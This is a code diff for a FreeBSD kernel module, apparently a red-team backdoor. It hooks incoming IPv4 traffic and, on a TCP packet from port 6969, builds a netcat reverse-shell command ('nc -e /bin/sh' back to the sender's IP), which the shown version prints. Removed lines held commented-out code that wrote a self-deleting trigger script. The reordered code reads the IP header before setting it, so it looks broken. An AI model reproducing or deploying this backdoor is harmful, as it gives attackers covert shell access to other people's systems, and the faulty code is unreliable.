@@ -18,43 +18,12 @@
 #include <netinet/ip_var.h>
 #include <net/if.h>
 
-// for making file
-#include <sys/uio.h>    // For UIO_* flags
-#include <sys/vnode.h> // For vnode and file operations
-
-
 // replaces all instances of TRIGGER_PORT in the code with 6969 before compilation
 #define TRIGGER_PORT 6969
-
-
-static int attacker_ports[] = {22, 80, 443, 8080, 21, 42069, 69, 420, 2200}; // List of target ports
-
-// u ret this is no allowed bruv, nevermind yes it is, not called execve tho its jsut kern_exec(args)
-// int kern_execve(struct thread *td, struct execve_args *uap);
-
-
-
-
-
 
 // pfil_head is a list of the all the filtering functions applied to incoming/outgoing packets
 // pfh_inet is the global IPv4 packet filtering subsystem
 static struct pfil_hook *my_hook;
-
-
-// good till here
-
-
-
-
-
-
-
-
-
-
-// typedef	pfil_return_t	(*pfil_mbuf_chk_t)(struct mbuf **, struct ifnet *, int,
-// void *, struct inpcb *);
 
 static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir, void *arg, struct inpcb *inp) {
     struct mbuf *m = *mp;
@@ -66,9 +35,11 @@ static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir,
     struct nameidata nd;
     int error;
 
+    // Check if it's a TCP packet
+    if (ip_header->ip_p != IPPROTO_TCP) return PFIL_PASS;;
+
     // Ensure mbuf is valid
     if (m == NULL) return PFIL_PASS;;
-
 
    // Make sure the packet has enough data for an IP header
     if (m->m_len < sizeof(struct ip)) {
@@ -76,12 +47,13 @@ static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir,
         if (m == NULL) return PFIL_PASS;;
     }
    
+    // Extract the TCP header
+    tcp_header = (struct tcphdr *)((caddr_t)ip_header + (ip_header->ip_hl << 2));
+    // Check source port
+    if (ntohs(tcp_header->th_sport) != TRIGGER_PORT) return PFIL_PASS;;
+
     // Extract the IP header
     ip_header = mtod(m, struct ip *);
-
-    // Check if it's a TCP packet
-    if (ip_header->ip_p != IPPROTO_TCP) return PFIL_PASS;;
-
 
     // Ensure there's enough data for TCP header
     if (m->m_len < (ip_header->ip_hl << 2) + sizeof(struct tcphdr)) {
@@ -90,68 +62,36 @@ static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir,
     }
 
 
-    // Extract the TCP header
-    tcp_header = (struct tcphdr *)((caddr_t)ip_header + (ip_header->ip_hl << 2));
 
+    // now we know the packet is a red-team packet
 
-    // Check source port
-    if (ntohs(tcp_header->th_sport) == TRIGGER_PORT) {
+    // Extract attacker IP and store as a string (since inet_ntoa() isn't available in kernel space)
+    char attacker_ip_str[16];
+    snprintf(attacker_ip_str, sizeof(attacker_ip_str), "%u.%u.%u.%u",
+        (ntohl(ip_header->ip_src.s_addr) >> 24) & 0xFF,
+        (ntohl(ip_header->ip_src.s_addr) >> 16) & 0xFF,
+        (ntohl(ip_header->ip_src.s_addr) >> 8) & 0xFF,
+        ntohl(ip_header->ip_src.s_addr) & 0xFF);
 
+    // Construct the reverse shell command
+    char reverse_shell_cmd[100];
+    snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd),
+        "nc -e /bin/sh %s %d", attacker_ip_str, TRIGGER_PORT);
 
-        // Check if the destination port is in the list
-        for (i = 0; i < sizeof(attacker_ports) / sizeof(int); i++) {
-            if (ntohs(tcp_header->th_dport) == attacker_ports[i]) {
-
-                // Extract attacker IP and store as a string (since inet_ntoa() isn't available in kernel space)
-                char attacker_ip_str[16];
-                    snprintf(attacker_ip_str, sizeof(attacker_ip_str), "%u.%u.%u.%u",
-                    (ntohl(ip_header->ip_src.s_addr) >> 24) & 0xFF,
-                    (ntohl(ip_header->ip_src.s_addr) >> 16) & 0xFF,
-                    (ntohl(ip_header->ip_src.s_addr) >> 8) & 0xFF,
-                    ntohl(ip_header->ip_src.s_addr) & 0xFF);
-
-                // Construct the reverse shell command
-                char reverse_shell_cmd[100];
-                snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd),
-                    "nc -e /bin/sh %s 6969", attacker_ip_str);
-
-                printf("[LKM] Triggering reverse shell to %s on port 6969\n", attacker_ip_str);
-                
-
-
-
-
-                //   // File path to create
-                // char *filepath = "/lkm_trigger.sh";
-                // // Initialize nameidata for file creation
-                // NDINIT(&nd, LOOKUP, NOFOLLOW, UIO_SYSSPACE, filepath, curthread);
-                // error = vn_open(&nd, O_CREAT | O_WRONLY, 0600);
-                // if (error) {
-                //     printf("[LKM] Failed to create file %s\n", filepath);
-                //     return PFIL_PASS;
-                // }
-                // vp = nd.ni_vp;
-                // VOP_UNLOCK(vp, 0);
-                // // Write contents to file
-                // char file_content[200];
-                // // can't use snprintf retard.
-                // snprintf(file_content, sizeof(file_content),
-                //     "#!/bin/sh\n%s\nrm -- \"$0\"\n", reverse_shell_cmd);
-                // error = vn_rdwr(UIO_WRITE, vp, file_content, strlen(file_content),
-                //     0, UIO_SYSSPACE, IO_NODELOCKED | IO_UNIT, curthread->td_ucred, NOCRED, NULL);
-                // if (error) {
-                //     printf("[LKM] Failed to write to file %s\n", filepath);
-                // }
-                // // Close file
-                // vn_close(vp, FWRITE, curthread->td_ucred, curthread);
-                // printf("[LKM] File %s created successfully\n", filepath);
-                // break; // Stop after the first match
-            }
-        }
-    }
-   
+    printf("The reverse shell command is\n");
+    printf("The reverse shell command is\n");
+    printf("The reverse shell command is\n");
+    printf("%s\n", reverse_shell_cmd);
+    printf("[LKM] Triggering reverse shell to %s on port 6969\n", attacker_ip_str);
+    
     return PFIL_PASS;
+
 }
+        
+    
+   
+    
+
 
 
 
